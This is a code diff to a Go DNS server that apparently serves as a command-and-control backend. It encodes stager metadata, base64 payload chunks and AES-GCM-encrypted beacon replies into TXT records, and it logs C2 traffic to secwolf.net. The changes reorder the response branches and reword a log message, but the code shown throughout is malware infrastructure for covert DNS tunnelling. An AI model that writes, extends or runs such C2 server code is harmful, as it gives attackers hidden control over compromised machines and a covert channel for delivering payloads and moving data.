@@ -233,13 +233,14 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 			case 16: // TXT record - encode response
 				var encoded string
 
-				// Check if this is a stager response
-				if strings.HasPrefix(c2Response, "META|") {
-					// META response - use base36 encoding
-					encoded = base36EncodeString(c2Response)
-				} else if strings.HasPrefix(c2Response, "CHUNK|") {
-					// CHUNK response - data is already base64 encoded, send as-is
+				// CHUNK responses are plain text (base64 data is already DNS-safe)
+				// META responses need base36 encoding for DNS compatibility
+				if strings.HasPrefix(c2Response, "CHUNK|") {
+					// CHUNK responses sent as plain text (data is already base64)
 					encoded = c2Response
+				} else if strings.HasPrefix(c2Response, "META|") {
+					// Stager META responses - use base36 encoding only (no encryption)
+					encoded = base36EncodeString(c2Response)
 				} else {
 					// Beacon response - use AES-GCM + base36
 					var encErr error
@@ -248,9 +249,7 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 						// Fallback to plain response if encryption fails
 						encoded = c2Response
 					}
-				}
-
-				// TXT records need proper length-prefixed format
+				} // TXT records need proper length-prefixed format
 				// Each string in a TXT record can be max 255 bytes
 				var txtData []byte
 
@@ -524,7 +523,7 @@ func main() {
 					if strings.Contains(qname, "secwolf.net") {
 						parts := strings.SplitN(qname, ".", 2)
 						if len(parts) > 0 && len(parts[0]) > 20 {
-							logf("C2 traffic detected from %s", raddr.String())
+							logf("Possible C2 traffic detected from %s", raddr.String())
 						}
 					}
 				}
